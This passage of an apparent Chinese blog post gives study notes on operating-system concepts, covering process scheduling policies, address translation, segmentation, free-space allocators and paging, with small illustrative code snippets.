class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出：</p><p>无。</p><p>没有输出。</p><p>习题到此为止。</p><h1 id="第六章-机制：受限直接执行"><a href="#第六章-机制：受限直接执行" class="headerlink" title="第六章 机制：受限直接执行"></a>第六章 机制：受限直接执行</h1><h2 id="三种切换内核态"><a href="#三种切换内核态" class="headerlink" title="三种切换内核态"></a>三种切换内核态</h2><ul><li>系统调用</li><li>异常</li><li>中断</li></ul><p>以下是直接运行协议：</p><p><img src="/2023/03/23/Operating-Systems/p4.png"></p><p>其过程大致是：在操作系统上进行一系列准备操作（进程列表上创建条目、分配内存、加载、设置栈等等），如何程序执行交还程序本身，进行执行，最后由操作系统收尾（清除内存等）。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>引入一种新的处理器模式：用户模式（user mode）；</p><p>在用户模式下，进程会受到限制，例如不能发出I/O请求。</p><p>与用户模式不同的内核模式（kernel mode），操作系统（或内核）就以这种模式运行。 在此模式下，运行的代码可以做它喜欢的事，包括特权操作。</p><p>内核通过在启动时设置陷阱表（trap table）来实现。当机器启动时，它在特权（内核）模 式下执行，因此可以根据需要自由配置机器硬件。操作系统做的第一件事，就是告诉硬件在发生某些异常事件时要运行哪些代码。</p><h2 id="进程间切换"><a href="#进程间切换" class="headerlink" title="进程间切换"></a>进程间切换</h2><p><strong>时钟中断（timer interrupt）</strong></p><p>时钟设备可以编程为每隔几毫秒产生一次中断。产生中断时，当前正在运行的进 程停止，操作系统中预先配置的<strong>中断处理程序（interrupt handler）</strong>会运行。此时，操作系统 重新获得 CPU 的控制权，因此可以做它想做的事：停止当前进程，并启动另一个进程。</p><p>是继续运行当前正在运行的进程，还是切换到另一个进程。这 个决定是由<strong>调度程序（scheduler）</strong>做出的，它是操作系统的一部分。</p><h3 id="上下文切换"><a href="#上下文切换" class="headerlink" title="上下文切换"></a>上下文切换</h3><p>操作系统要做的就是为当前正在执行的进程保存一些寄存器 的值（例如，到它的内核栈），并为即将执行的进程恢复一些寄存器的值（从它的内核栈）。</p><p>为了保存当前正在运行的进程的上下文，操作系统会执行一些底层汇编代码，来保存 通用寄存器、程序计数器，以及当前正在运行的进程的内核栈指针，然后恢复寄存器、程 序计数器，并切换内核栈，供即将运行的进程使用。</p><p><img src="/2023/03/23/Operating-Systems/p5.png"></p><h1 id="第七章-进程调度：介绍"><a href="#第七章-进程调度：介绍" class="headerlink" title="第七章 进程调度：介绍"></a>第七章 进程调度：介绍</h1><p><strong>调度策略（sheculing policy）</strong></p><p><strong>T 周转时间= T 完成时间−T 到达时间</strong></p><p><strong>FIFO先进先出</strong></p><p>A 先运行 100s，B 或 C 才有机会运行。因此，系统的平均周转时间是比 较高的：令人不快的 110s（（100 + 110 + 120）/ 3 = 110）。<strong>护航效应（convoy effect）</strong></p><h3 id="最短任务优先（SJF）"><a href="#最短任务优先（SJF）" class="headerlink" title="最短任务优先（SJF）"></a>最短任务优先（SJF）</h3><p>这个新的调度准则被称为最短任 务优先（Shortest Job First，SJF），该名称应该很容易记住，因为它完全描述了这个策略： 先运行最短的任务，然后是次短的任务，如此下去。</p><h3 id="最短完成时间优先（STCF）"><a href="#最短完成时间优先（STCF）" class="headerlink" title="最短完成时间优先（STCF）"></a>最短完成时间优先（STCF）</h3><p>当 B 和 C 到达时，调度程序当然可以做其他事情：它可以抢占（preempt）工作 A，并 决定运行另一个工作，或许稍后继续工作 A。根据我们的定义，SJF 是一种非抢占式 （non-preemptive）调度程序</p><p>向 SJF 添加抢占，称为<strong>最短完成时间优先（Shortest Time-to-Completion First，STCF）</strong>或<strong>抢占式最短作业优先（Preemptive Shortest Job First ，PSJF）</strong>调度程序</p><h3 id="新度量指标：响应时间"><a href="#新度量指标：响应时间" class="headerlink" title="新度量指标：响应时间"></a>新度量指标：响应时间</h3><p><strong>T 响应时间= T 首次运行−T 到达时间</strong></p><p>例如，如果 3 个工作同时到 达，第三个工作必须等待前两个工作全部运行后才能运行。这种方法虽然有很好的周转时 间，但对于响应时间和交互性是相当糟糕的。假设你在终端前输入，不得不等待 10s 才能看 到系统的回应，只是因为其他一些工作已经在你之前被调度：你肯定不太开心。</p><h3 id="轮转"><a href="#轮转" class="headerlink" title="轮转"></a>轮转</h3><p>RR 在一个<strong>时间片（time slice，有时称为调度量子，scheduling quantum）</strong>内运行一个工作，然后切换到运行队列中的下一个任务，而不是运行一个任务直 到结束。它反复执行，直到所有任务完成。</p><p><strong>时间片长度必须是时钟中断周期的倍数</strong></p><p>时间片太短是有问题的：突然上下文切换的成本将影响整体性能。因此，系统设计者 需要权衡时间片的长度，使其足够长，以便<strong>摊销（amortize）</strong>上下文切换成本，而又不会使 系统不及时响应。</p><p><strong>如果周转时间是我们的指标，那么 RR 确实是最糟糕的策略之一</strong></p><p>RR会趋向于每个进程都要耗费数倍的时间完成。</p><p>我们开发了两种调度程序。第一种类型（SJF、STCF）<strong>优化周转时间，但对响应时间不利。</strong>第二种类型（RR）<strong>优化响应时间，但对周转时间不利</strong>。</p><p>不能  <strong>“既要。。。又要。。。”</strong></p><h3 id="结合I-O"><a href="#结合I-O" class="headerlink" title="结合I/O"></a>结合I/O</h3><p>一种常见的方法是将 A 的每个 10ms 的子工作视为一项独立的工作。因此，当系统启动 时，它的选择是调度 10ms 的 A，还是 50ms 的 B。对于 STCF，选择是明确的：选择较短的 一个，在这种情况下是 A。然后，A 的工作已完成，只剩下 B，并开始运行。然后提交 A 的一个新子工作，它抢占 B 并运行 10ms。这样做可以实现重叠（overlap），一个进程在等 待另一个进程的 I/O 完成时使用 CPU，系统因此得到更好的利用</p><p><img src="/2023/03/23/Operating-Systems/p6.png"></p><h1 id="第八章-调度：多级反馈队列"><a href="#第八章-调度：多级反馈队列" class="headerlink" title="第八章 调度：多级反馈队列"></a>第八章 调度：多级反馈队列</h1><h2 id="MLFQ：基本规则"><a href="#MLFQ：基本规则" class="headerlink" title="MLFQ：基本规则"></a>MLFQ：基本规则</h2><p>例如，如果一个工作不断放弃 CPU 去等待键盘输入，这是交互型进程的可能行为，MLFQ 因此会让它保持高优先级。相 反，如果一个工作长时间地占用 CPU，MLFQ 会降低其优先级。通过这种方式，MLFQ 在 进程运行过程中学习其行为，从而利用工作的历史来预测它未来的行为。</p><p>至此，我们得到了 MLFQ 的两条基本规则。</p><p> 规则 1：如果 A 的优先级 &gt; B 的优先级，运行 A（不运行 B）。 </p><p>规则 2：如果 A 的优先级 = B 的优先级，轮转运行 A 和 B。</p><h2 id="改变优先级"><a href="#改变优先级" class="headerlink" title="改变优先级"></a>改变优先级</h2><p>我们必须决定，在一个工作的生命周期中，MLFQ 如何改变其优先级（在哪个队列中）。 要做到这一点，我们必须记得工作负载：既有运行时间很短、频繁放弃 CPU 的交互型工作， 也有需要很多 CPU 时间、响应时间却不重要的长时间计算密集型工作。下面是我们第一次 尝试优先级调整算法。</p><p>规则 3：工作进入系统时，放在最高优先级（最上层队列）。 </p><p>规则 4a：工作用完整个时间片后，降低其优先级（移入下一个队列）。 </p><p>规则 4b：如果工作在其时间片以内主动释放 CPU， 则优先级不变。</p><p>如果不知道工作是短工 作还是长工作，那么就在开始的时候假设其是短工作，并赋予最高优先级。如果确实是短 工作，则很快会执行完毕，否则将被慢慢移入低优先级队列，而这时该工作也被认为是长 工作了。通过这种方式，MLFQ 近似于 SJF。</p><p><strong>有I/O</strong>：</p><p>如果进程在时间片用完之前主动放弃 CPU， 则保持它的优先级不变。这条规则的意图很简单：假设交互型工作中有大量的 I/O 操作（比 如等待用户的键盘或鼠标输入），它会在时间片用完之前放弃 CPU。在这种情况下，我们不 想处罚它，只是保持它的优先级不变。</p><p><img src="/2023/03/23/Operating-Systems/p7.png"></p><p>关于MLFQ的问题：</p><p>首先，会有饥饿（starvation）问题。如果系统有“太多”交互型工作，就会不断占用 CPU，导致长工作永远无法得到 CPU（它们饿死了）。即使在这种情况下，我们希望这些长 工作也能有所进展。</p><p>其次，聪明的用户会重写程序，愚弄调度程序（game the scheduler）。愚弄调度程序指 的是用一些卑鄙的手段欺骗调度程序，让它给你远超公平的资源。上述算法对如下的攻击 束手无策：进程在时间片用完之前，调用一个 I/O 操作（比如访问一个无关的文件），从而 主动释放 CPU。如此便可以保持在高优先级，占用更多的 CPU 时间。做得好时（比如，每 运行 99%的时间片时间就主动放弃一次 CPU），工作可以几乎独占 CPU。</p><h2 id="尝试提高优先级"><a href="#尝试提高优先级" class="headerlink" title="尝试提高优先级"></a>尝试提高优先级</h2><p><strong>规则 5：</strong>经过一段时间 S，就将系统中所有工作重新加入最高优先级队列。</p><h2 id="尝试更好的计时方法"><a href="#尝试更好的计时方法" class="headerlink" title="尝试更好的计时方法"></a>尝试更好的计时方法</h2><p>这里的解决方案，是为 MLFQ 的每层队列提供更完善的 CPU 计时方式（accounting）。 调度程序应该记录一个进程在某一层中消耗的总时间，而不是在调度时重新计时。只要进 程用完了自己的配额，就将它降到低一优先级的队列中去。不论它是一次用完的，还是拆 成很多次用完。因此，我们重写规则 4a 和 4b。</p><p><strong>规则 4</strong>：一旦工作用完了其在某一层中的时间配额（无论中间主动放弃了多少次 CPU），就降低其优先级（移入低一级队列）。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">//小结：<br> 规则 <span class="hljs-number">1</span>：如果 <span class="hljs-keyword">A</span> 的优先级 &gt; B 的优先级，运行 <span class="hljs-keyword">A</span>（不运行 B）。<br> 规则 <span class="hljs-number">2</span>：如果 <span class="hljs-keyword">A</span> 的优先级 = B 的优先级，轮转运行 <span class="hljs-keyword">A</span> 和 B。<br> 规则 <span class="hljs-number">3</span>：工作进入系统时，放在最高优先级（最上层队列）。<br> 规则 <span class="hljs-number">4</span>：一旦工作用完了其在某一层中的时间配额（无论中间主动放弃了多少次<br>        CPU），就降低其优先级（移入低一级队列）。<br> 规则 <span class="hljs-number">5</span>：经过一段时间 S，就将系统中所有工作重新加入最高优先级队列。<br></code></pre></td></tr></table></figure><h1 id="第九章-调度：比例份额"><a href="#第九章-调度：比例份额" class="headerlink" title="第九章 调度：比例份额"></a>第九章 调度：比例份额</h1><p>在本章中，我们来看一个不同类型的调度程序——比例份额（proportional-share）调度 程序，有时也称为公平份额（fair-share）调度程序。比例份额算法基于一个简单的想法：调 度程序的最终目标，是确保每个工作获得一定比例的 CPU 时间，而不是优化周转时间和响 应时间。</p><h2 id="基本概念：彩票数表示份额"><a href="#基本概念：彩票数表示份额" class="headerlink" title="基本概念：彩票数表示份额"></a>基本概念：彩票数表示份额</h2><p>下面来看一个例子。假设有两个进程 A 和 B，A 拥有 75 张彩票，B 拥有 25 张。因此 我们希望 A 占用 75%的 CPU 时间，而 B 占用 25%。</p><p>通过不断定时地（比如，每个时间片）抽取彩票，彩票调度从概率上（但不是确定的） 获得这种份额比例。抽取彩票的过程很简单：调度程序知道总共的彩票数（在我们的例子 中，有 100 张）。调度程序抽取中奖彩票，这是从 0 和 99①之间的一个数，拥有这个数对应 的彩票的进程中奖。假设进程 A 拥有 0 到 74 共 75 张彩票，进程 B 拥有 75 到 99 的 25 张， 中奖的彩票就决定了运行 A 或 B。调度程序然后加载中奖进程的状态，并运行它。</p><h1 id="第11章-关于-CPU-虚拟化的总结"><a href="#第11章-关于-CPU-虚拟化的总结" class="headerlink" title="第11章 关于 CPU 虚拟化的总结"></a>第11章 关于 CPU 虚拟化的总结</h1><h1 id="第12章-关于内存虚拟化的对话"><a href="#第12章-关于内存虚拟化的对话" class="headerlink" title="第12章 关于内存虚拟化的对话"></a>第12章 关于内存虚拟化的对话</h1><h1 id="第14章-插叙：内存操作-API"><a href="#第14章-插叙：内存操作-API" class="headerlink" title="第14章 插叙：内存操作 API"></a>第14章 插叙：内存操作 API</h1><h1 id="第-15-章-机制：地址转换"><a href="#第-15-章-机制：地址转换" class="headerlink" title="第 15 章 机制：地址转换"></a>第 15 章 机制：地址转换</h1><p><strong>受限直接访问</strong>（Limited Direct Execution，LDE）：：让程序运行的大部分指令直接访问硬件，只在 一些关键点（如进程发起系统调用或发生时钟中断）由操作系统介入来确保“在正确时间， 正确的地点，做正确的事”。</p><h2 id="静态重定位"><a href="#静态重定位" class="headerlink" title="静态重定位"></a>静态重定位</h2><p>基本技术被称为静态重定位（static relocation），其中一个名为加载程序（loader）的软件接手将要运行的可执行程序，将它的地址重写到物理内存中期望的偏移位置。 </p><p>例如，程序中有一条指令是从地址 1000 加载到寄存器（即 movl 1000，%eax），当整个程序的地址 空间被加载到从 3000（不是程序认为的 0）开始的物理地址中，加载程序会重写指令中的地址（即 movl 4000, %eax），从而完成简单的静态重定位</p><p><strong>也就是直接改写代码中的地址，完成重定位</strong></p><h2 id="动态重定位"><a href="#动态重定位" class="headerlink" title="动态重定位"></a>动态重定位</h2><p><strong>基址（base）寄存器</strong>和<strong>界限（bound）寄存器</strong>，程序执行时，操作系统会决定其在物理内存中的实际加载地址，并将起始地址记录在基址寄存器中。</p><p>现在，该进程产生的所有内存引用，都会被处理器通过以下方式转换为物理地址：</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">physical <span class="hljs-built_in">address</span> = virtual <span class="hljs-built_in">address</span> + <span class="hljs-built_in">base</span><br></code></pre></td></tr></table></figure><p>进程中使用的内存引用都是<strong>虚拟地址（virtual address）</strong>，硬件接下来将虚拟地址加上基址寄存器中的内容，得到<strong>物理地址（physical address）</strong>，再发给内存系统。</p><p>将虚拟地址转换为物理地址，这正是所谓的<strong>地址转换（address translation）技术</strong>。也就是说，硬件取得进程认为它要访问的地址，将它<strong>转换</strong>成数据实际位于的物理地址。</p><p><strong>界限寄存器</strong>：硬件在将虚拟地址与基址寄存器内容求和前，就检查这个界限。如果超出界限，就产生错误。</p><h1 id="第十六章-分段"><a href="#第十六章-分段" class="headerlink" title="第十六章 分段"></a>第十六章 分段</h1><h2 id="显示引用段"><a href="#显示引用段" class="headerlink" title="显示引用段"></a>显示引用段</h2><p>例如使用14位虚拟地址的前两位来标识。</p><p>第13、12位（第0位开始）作为段标识，若这两位是00，则硬件知道，这是属于代码段的地址，便使用代码段的基址和界限来重定位到正确的物理地址。若前两位是 01，则是堆地址，使用堆的基址和界限。</p><p>如某一个虚拟地址：</p><p>01 0000 0110 1000</p><p>其前2位表示这是引用的堆段，后12位是段内偏移。偏移量与基址寄存器相加，硬件就得到了最终的物理地址。</p><p>请注意，偏移量也简化了对段边界的判断。我们只要检查偏移量是否小于界限，大于界限的为非法地址。</p><h2 id="隐式引用段"><a href="#隐式引用段" class="headerlink" title="隐式引用段"></a>隐式引用段</h2><p>利用地址是如何产生的，来区分不同的段</p><p>在隐式（implicit）方式中，硬件通过地址产生的方式来确定段。例如，如果地址由程序计数器产生（即它是指令获取），那么地址在代码段。如果基于栈或基址指针，它一定在栈段。其他地址则在堆段。</p><h2 id="栈是反向生长的"><a href="#栈是反向生长的" class="headerlink" title="栈是反向生长的"></a>栈是反向生长的</h2><p>首先，我们需要一点硬件支持。除了基址和界限外，硬件还需要知道段的增长方向，使用一位区分，比如 1 代表自小而大增长，0 反之。</p><h2 id="支持共享"><a href="#支持共享" class="headerlink" title="支持共享"></a>支持共享</h2><p>为了支持共享，需要一些额外的硬件支持，这就是<strong>保护位（protection bit）</strong>。</p><p>为每个段增加了几个位，标识程序是否能够读写该段，或执行其中的代码。</p><h2 id="粗粒度与细粒度"><a href="#粗粒度与细粒度" class="headerlink" title="粗粒度与细粒度"></a>粗粒度与细粒度</h2><p>到目前为止，我们的例子大多针对只有很少的几个段的系统（即代码、栈、堆）。</p><p>我们可以认为这种分段是<strong>粗粒度的（coarse-grained）</strong>;</p><p>但是，一些早期系统（如 Multics[CV65, DD68]）更灵活，允许将地址空间划分为大量较小的段，这被称为<strong>细粒度（fine-grained）分段。</strong></p><h1 id="第-17-章-空闲空间管理"><a href="#第-17-章-空闲空间管理" class="headerlink" title="第 17 章 空闲空间管理"></a>第 17 章 空闲空间管理</h1><h2 id="外部碎片问题"><a href="#外部碎片问题" class="headerlink" title="外部碎片问题"></a>外部碎片问题</h2><p><strong>外部碎片（external fragmentation）</strong>的问题：空闲空间被分割成不同大小的小块，成为碎片，后续的请求可能失败，因为没有一块足够大的连续空闲空间，即使这时总的空闲空间超出了请求的大小。</p><p><strong>空闲列表（free list）</strong>：在堆上管理空闲空间的数据结构通常称为空闲列表（free list）；</p><h2 id="内部碎片"><a href="#内部碎片" class="headerlink" title="内部碎片"></a>内部碎片</h2><p>如果分配程序给出的内存块超出请求的大小，在这种块中超出请求的空间（因此而未使用）就被认为是内部碎片（因为浪费发生在已分配单元的内部），这是另一种形式的空间浪费。</p><h2 id="底层机制"><a href="#底层机制" class="headerlink" title="底层机制"></a>底层机制</h2><h3 id="分割与合并"><a href="#分割与合并" class="headerlink" title="分割与合并"></a>分割与合并</h3><p>比如某 30 字节的堆，其 10 ~ 20 字节被占用，则空闲列表会有两个元素，一个描述第一个 10 字节的空闲区域（0 ~ 9），另一个描述另一个空闲区域（字节 20～29）</p><p>通过上面的介绍可以看出，任何大于 10 字节的分配请求都会失败（返回 NULL），因为没有足够的连续可用空间。而恰好 10 字节的需求可以由两个空闲块中的任何一个满足。但是，如果申请小于 10 字节空间，会发生什么？</p><p>假设我们只申请一个字节的内存。这种情况下，分配程序会执行所谓的<strong>分割（splitting）动作</strong>：它找到一块可以满足请求的空闲空间，将其分割，第一块返回给用户，第二块留在空闲列表中。</p><p>而当 free 掉中间的拦路虎，这个 10byte 的空间时，空闲列表会将空闲空间<strong>合并（coalescing）</strong>，而不是在原位置增加一个【addr ：10，len ：10】</p><p>通过合并，我们会获得一个更大的连续的可分配空间。</p><h3 id="追踪已分配空间的大小"><a href="#追踪已分配空间的大小" class="headerlink" title="追踪已分配空间的大小"></a>追踪已分配空间的大小</h3><p>对于 <code>free(void *ptr)</code>函数调用，这个接口没有块大小的参数。</p><p>要完成这个任务，大多数分配程序都会在头块（header）中保存一点额外的信息，它在内存中，通常就在返回的内存块之前。</p><p>我们检查一个 20 字节的已分配块，由 ptr 指着，设想用户调用了 malloc()，并将结果保存在 ptr 中：ptr = malloc(20)。</p><p>该头块中至少包含所分配空间的大小（这个例子中是 20）。</p><p>它也可能包含一些额外的指针来加速空间释放，包含一个幻数来提供完整性检查，以及其他信息。</p><p>上面的例子看起来会像图 17.2 的样子。用户调用 free(ptr) 时，库会通过简单的指针运算得到头块的位置：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr)</span> </span>&#123;<br> <span class="hljs-type">header_t</span> *hptr = (<span class="hljs-type">void</span> *)ptr - <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">header_t</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>也就是说，指针指向完整的一块空间，头块是分配地址时，于这块空间之前，分配的一个结构体，其内部存储了一些信息，比如接下来的分配了的空间的大小。</p><p><img src="/2023/03/23/Operating-Systems/p8.png"></p><p><strong>实际释放的是头块大小加上分配给用户的空间的大小</strong>。因此，如果用户请求 N 字节的内存，库不是寻找大小为 N 的空闲块，而是寻找 N 加上头块大小的空闲块。</p><h2 id="嵌入空闲列表"><a href="#嵌入空闲列表" class="headerlink" title="嵌入空闲列表"></a>嵌入空闲列表</h2><p><img src="/2023/03/23/Operating-Systems/p9.png"></p><p>类似分配的头块一样，空闲空间的头部，也会有“空闲头块”，来指明其后续空间有多少可用，下一块空闲空间在哪。</p><p>当内存中，前三块分配了100+8（head）的空间后，又将中间那块内存给释放掉，就会出现下图的变化：</p><p><img src="/2023/03/23/Operating-Systems/p10.png"></p><h2 id="让堆增长"><a href="#让堆增长" class="headerlink" title="让堆增长"></a>让堆增长</h2><p>当堆的空间用完后，有以下两种应对方式：</p><ul><li>直接返回错误/NULL；</li><li>使用某些系统调用（如UNIX中的 sbrk），让堆增长。最开始分配一个小的堆空间，随着使用时的不够用，再增大。</li></ul><h2 id="基本策略"><a href="#基本策略" class="headerlink" title="基本策略"></a>基本策略</h2><h3 id="最优匹配"><a href="#最优匹配" class="headerlink" title="最优匹配"></a>最优匹配</h3><p><strong>最优匹配（best fit）</strong>策略非常简单：首先遍历整个空闲列表，找到和请求大小一样或更大的空闲块，然后返回这组候选者中最小的一块。这就是所谓的最优匹配（也可以称为最小匹配）。只需要遍历一次空闲列表，就足以找到正确的块并返回。</p><p>其可尽量返回最接近用户需求大小的块，尽量避免空间浪费。</p><h3 id="最差匹配"><a href="#最差匹配" class="headerlink" title="最差匹配"></a>最差匹配</h3><p>尽量找最大的块，从中间分一部分给用户的请求。最差匹配尝试在空闲列表中保留较大的块，而不是向最优匹配那样可能剩下很多难以利用的小块。但是，最差匹配同样需要遍历整个空闲列表。更糟糕的是，大多数研究表明它的表现非常差，导致过量的碎片，同时还有很高的开销。</p><h3 id="首次匹配"><a href="#首次匹配" class="headerlink" title="首次匹配"></a>首次匹配</h3><p><strong>首次匹配（first fit）</strong>策略就是找到第一个足够大的块，将请求的空间返回给用户。同样， 剩余的空闲空间留给后续请求。</p><p>首次匹配有速度优势，但有时会让空闲列表开头的部分有很多小块。</p><h3 id="下次匹配"><a href="#下次匹配" class="headerlink" title="下次匹配"></a>下次匹配</h3><p>不同于首次匹配每次都从列表的开始查找，<strong>下次匹配（next fit）</strong>算法多维护一个指针，指向上一次查找结束的位置。其想法是将对空闲空间的查找操作扩散到整个列表中去，避免对列表开头频繁的分割。</p><h2 id="其它方式"><a href="#其它方式" class="headerlink" title="其它方式"></a>其它方式</h2><h3 id="分离空闲列表"><a href="#分离空闲列表" class="headerlink" title="分离空闲列表"></a>分离空闲列表</h3><p>一直以来有一种很有趣的方式叫作<strong>分离空闲列表（segregated list）</strong>。基本想法很简单： 如果某个应用程序经常申请一种（或几种）大小的内存空间，那就用一个独立的列表，只管理这样大小的对象。其他大小的请求都一给更通用的内存分配程序。</p><p>这种方法的好处显而易见。通过拿出一部分内存专门满足某种大小的请求，碎片就不再是问题了。而且，由于没有复杂的列表查找过程，这种特定大小的内存分配和释放都很快。</p><h3 id="伙伴系统"><a href="#伙伴系统" class="headerlink" title="伙伴系统"></a>伙伴系统</h3><p>因为合并对分配程序很关键，所以人们设计了一些方法，让合并变得简单，一个好例子就是<strong>二分伙伴分配程序（binary buddy allocator）</strong></p><p>在这种系统中，空闲空间首先从概念上被看成大小为 2N 的大空间。当有一个内存分配请求时，空闲空间被递归地一分为二，直到刚好可以满足请求的大小（再一分为二就无法满足）。这时，请求的块被返回给用户。在下面的例子中，一个 64KB 大小的空闲空间被切分，以便提供 7KB 的块：</p><p><img src="/2023/03/23/Operating-Systems/p11.png"></p><p>在这个例子中，最左边的 8KB 块被分配给用户（如上图中深灰色部分所示）。请注意， 这种分配策略只允许分配 2 的整数次幂大小的空闲块，因此会有<strong>内部碎片（internal fragment）</strong> 的麻烦。</p><p>伙伴系统的漂亮之处在于块被释放时。如果将这个 8KB 的块归还给空闲列表，分配程序会检查“伙伴”8KB 是否空闲。如果是，就合二为一，变成 16KB 的块。然后会检查这个 16KB 块的伙伴是否空闲，如果是，就合并这两块。这个递归合并过程继续上溯，直到合并整个内存区域，或者某一个块的伙伴还没有被释放。</p><p>伙伴系统运转良好的原因，在于很容易确定某个块的伙伴。怎么找？仔细想想上面例子中的各个块的地址。如果你想得够仔细，就会发现每对互为伙伴的块只有<strong>一位不同</strong>，正是这一位决定了它们在整个伙伴树中的层次。现在你应该已经大致了解了二分伙伴分配程序的工作方式。</p><h1 id="第-18-章-分页：介绍"><a href="#第-18-章-分页：介绍" class="headerlink" title="第 18 章 分页：介绍"></a>第 18 章 分页：介绍</h1><p>将空间分割成固定长度的分片。在虚拟内存中，我们称这种思想为分页，可以追溯到一个早期的重要系统，Atlas[KE+62, L78]。分页不是将一个进程的地址空间分割成几个不同长度的逻辑段（即代码、堆、段），而是分割成固定大小的单元，每个单元称为一页。相应地，我们把物理内存看成是定长槽块的阵列，叫作页帧（page frame）。每个这样的页帧包含一个虚拟内存页。</p><p><img src="/2023/03/23/Operating-Systems/p12.png"></p><p>为了记录地址空间的每个虚拟页放在物理内存中的位置，操作系统通常为每个进程保存一个数据结构，称为<strong>页表（page table）</strong>。页表的主要作用是为地址空间的每个虚拟页面保存<strong>地址转换（address translation）</strong>，从而让我们知道每个页在物理内存中的位置。</p><p>页表因此具有以下 4 个条目：（虚拟页 0→物理帧 3）、（VP 1→PF 7）、 （VP 2→PF 5）和（VP 3→PF 2）。</p><p>重要的是要记住，这个页表是一个<strong>每进程</strong>的数据结构（我们讨论的大多数页表结构都是每进程的数据结构，我们将接触的一个例外是倒排页表，inverted page table）</p><p>现在，我们了解了足够的信息，可以完成一个地址转换的例子。设想拥有这个小地址 空间（64 字节）的进程正在访问内存：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">movl &lt;<span class="hljs-keyword">virtual</span> Address&gt; , %eax<br></code></pre></td></tr></table></figure><p>具体来说，注意从地址到寄存器 eax 的数据显式加载（因此忽略之前肯定会发生的指令获取）。</p><p>为了转换（translate）该过程生成的虚拟地址，我们必须首先将它分成两个组件：虚拟页面号（virtual page number，VPN）和页内的偏移量（offset）。对于这个例子，因为进程的虚拟地址空间是 64 字节，我们的虚拟地址总共需要 6 位（26 = 64）。因此，虚拟地址可以表示如下：</p><p>Va5   Va4   Va3  Va2  Va1  Va0</p><p>在该图中，Va5 是虚拟地址的最高位，Va0 是最低位。因为我们知道页的大小（16 字节）， 所以可以进一步划分虚拟地址，如下所示：</p><p><img src="/2023/03/23/Operating-Systems/p13.png"></p><p>页面大小为 16 字节，位于 64 字节的地址空间。因此我们需要能够选择 4 个页，地址 的前 2 位就是做这件事的。因此，我们有一个 2 位的虚拟页号（VPN）。其余的位告诉我们， 感兴趣该页的哪个字节，在这个例子中是 4 位，我们称之为偏移量。 当进程生成虚拟地址时，操作系统和硬件必须协作，将它转换为有意义的物理地址。 例如，让我们假设上面的加载是虚拟地址 21：</p><p><code>movl 21 , %eax</code></p><p>将“21”变成二进制形式，是“010101”，因此我们可以检查这个虚拟地址，看看它是 如何分解成虚拟页号（VPN）和偏移量的：</p><p><img src="/2023/03/23/Operating-Systems/p14.png"></p><p>因此，虚拟地址“21”在虚拟页“01”（或 1）的第 5 个（“0101”）字节处。通过虚拟 页号，我们现在可以检索页表，找到虚拟页 1 所在的物理页面。在上面的页表中，物理帧号（PFN）（有时也称为物理页号，physical page number 或 PPN）是 7（二进制 111）。因此， 我们可以通过用 PFN 替换 VPN 来转换此虚拟地址， 然后将载入发送给物理内存（见图 18.3）。</p><p><img src="/2023/03/23/Operating-Systems/p15.png"></p><p>请注意，偏移量保持不变（即未翻译），因为偏 移量只是告诉我们页面中的哪个字节是我们想要的。 我们的最终物理地址是 1110101（十进制 117），正是 我们希望加载指令（见图 18.2）获取数据的地方。</p><h2 id="页表存在哪里"><a href="#页表存在哪里" class="headerlink" title="页表存在哪里"></a>页表存在哪里</h2><p>稍后我们会看到，很多 操作系统内存本身都可以虚拟化，因此页表可以存储在操 作系统的虚拟内存中（甚至可以交换到磁盘上）</p><h2 id="列表中有什么"><a href="#列表中有什么" class="headerlink" title="列表中有什么"></a>列表中有什么</h2><p>页表就是一种数据结构，用于将虚拟地址（或者实际上，是虚拟页号）映射到物理地址（物理帧号）。</p><p>最简单的形式称为线性页表（linear page table），就是一个数组。操作系统通过虚拟页号（VPN）检索该数组，并在该索引处查找页表项（PTE），以便找到期望的物理帧号（PFN）。</p><p>至于每个 PTE 的内容，我们在其中有许多不同的位，值得有所了解。<strong>有效位（valid bit）</strong> 通常用于指示特定地址转换是否有效。例如，当一个程序开始运行时，它的代码和堆在其地址空间的一端，栈在另一端。所有未使用的中间空间都将被标记为<strong>无效（invalid）</strong>，如果进程尝试访问这种内存，就会陷入操作系统，可能会导致该进程终止。</p><p>我们还可能有<strong>保护位（protection bit）</strong>，表明页是否可以读取、写入或执行。同样，以这 些位不允许的方式访问页，会陷入操作系统</p><p>还有其他一些重要的部分，但现在我们不会过多讨论。<strong>存在位（present bit）</strong>表示该页 是在物理存储器还是在磁盘上（即它已被换出，swapped out）。当我们研究如何将部分地址 <strong>空间交换（swap）</strong>到磁盘，从而支持大于物理内存的地址空间时，我们将进一步理解这一 机制。交换允许操作系统将很少使用的页面移到磁盘，从而释放物理内存。<strong>脏位（dirty bit）</strong> 也很常见，表明页面被带入内存后是否被修改过。</p><p><strong>参考位（reference bit，也被称为访问位，accessed bit）</strong>有时用于追踪页是否被访问，也 用于确定哪些页很受欢迎，因此应该保留在内存中。这些知识在页面替换（page replacement） 时非常重要，我们将在随后的章节中详细研究这一主题。</p><p><img src="/2023/03/23/Operating-Systems/p16.png"></p><h2 id="分页：也很慢"><a href="#分页：也很慢" class="headerlink" title="分页：也很慢"></a>分页：也很慢</h2><p><strong>页表基址寄存器（page-table base register）</strong>包含页表的起始位置的物理地址。</p><p>为了找到想要的 PTE 的位置，硬件将执行以下功能：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">VPN</span> = (VirtualAddress &amp; VPN_MASK) &gt;&gt; SHIFT<br><span 